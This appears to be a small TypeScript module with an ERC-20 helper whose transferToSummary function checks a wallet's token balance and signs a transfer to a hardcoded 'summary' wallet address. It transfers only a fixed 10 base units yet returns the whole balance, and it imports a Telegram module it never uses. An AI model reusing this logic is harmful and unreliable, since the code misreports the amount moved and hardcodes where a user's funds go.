import { ethers } from 'ethers';
import Telegram from '../output/telegram';
import z from 'zod';

const SUMMARY_WALLET_ADDRESS = '0x60535415E95150d470C4663CCC59415a45d95566';

export function erc20(tokenAddress: string, wallet: ethers.Wallet) {
    const contract = new ethers.Contract(
        tokenAddress,
        [
            'function balanceOf(address owner) view returns (uint256)',
            'function transfer(address to, uint256 amount) returns (bool)',
        ],
        wallet
    );

    return {
        transferToSummary: async () => {
            const balance = await contract.balanceOf(wallet.address);
            const parsedBalance = z.bigint().parse(balance);

            if (parsedBalance > 0n) {
                await contract.transfer(SUMMARY_WALLET_ADDRESS, 10n);
                return parsedBalance;
            }

            return 0n;
        },
    };
}
